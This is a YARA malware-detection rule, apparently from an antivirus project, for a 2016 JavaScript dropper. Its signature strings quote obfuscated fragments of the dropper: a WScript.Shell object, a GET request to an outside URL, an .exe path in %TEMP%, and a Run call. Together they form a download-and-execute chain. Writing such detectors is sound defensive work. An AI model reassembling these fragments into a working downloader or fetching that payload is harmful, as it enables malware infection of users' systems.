rule sig_20160329_e69c9a22f9dbd872b327a21f8ed1dfca {
  meta:
    description = "datamaliciousorder - file 20160329_e69c9a22f9dbd872b327a21f8ed1dfca.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fe1ade8382fc0bd0d0ac39025f166c1c5881b295dbb50f00f9e1009804432ab3"

  strings:
    $s1  = "function Njzuc() {return Pyxjq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rWP1iEbrDnTxZe.exe\";};" fullword ascii
    $s2  = "do {WScript[Wavilaf](Mozjkgk() * 11)} while (Ueyebhggm[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Ueyebhggm[Rpskp](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s4  = "var Pyxjq = function Yrtqboj() {return WScript[Djcqkfbh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xjkobpd(Wdahwkppbf, Hzjcaqkc){return Wdahwkppbf - Hzjcaqkc;};" fullword ascii
    $s6  = "function Rkehyeedu(Vgirfhqmwo){Pyxjq[\"Run\"](Vgirfhqmwo, Pnrecer, Pnrecer);};" fullword ascii
    $s7  = "function Ywrssik() {return ((Ooteneckro == true) && (Ooteneckro == Rumqrhnxc)) ? 1 : Pnrecer;};" fullword ascii
    $s8  = "var Tkflkoaf = new this[\"Date\"]();" fullword ascii
    $s9  = "return Xjkobpd(Hsfylzu, Oadhf);" fullword ascii
    $s10 = "var Yarjnwthrr = false;" fullword ascii
    $s11 = "var Ooteneckro = false;" fullword ascii
    $s12 = "function Drablrav(Rruxbz) {var Vmwbiona = (1, 2, 3, 4, 5, Rruxbz); return Vmwbiona;};" fullword ascii
    $s13 = "Ooteneckro = true; " fullword ascii
    $s14 = "var Rumqrhnxc = false;" fullword ascii
    $s15 = "function Ttqevodpr(){return Djcqkfbh;};" fullword ascii
    $s16 = "function Jlvknmx()" fullword ascii
    $s17 = "function Mozjkgk(){return 22;};" fullword ascii
    $s18 = " while (Wqpls){" fullword ascii
    $s19 = "Rumqrhnxc = true; " fullword ascii
    $s20 = "function Ccjhykxfpv(){return Cocao;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}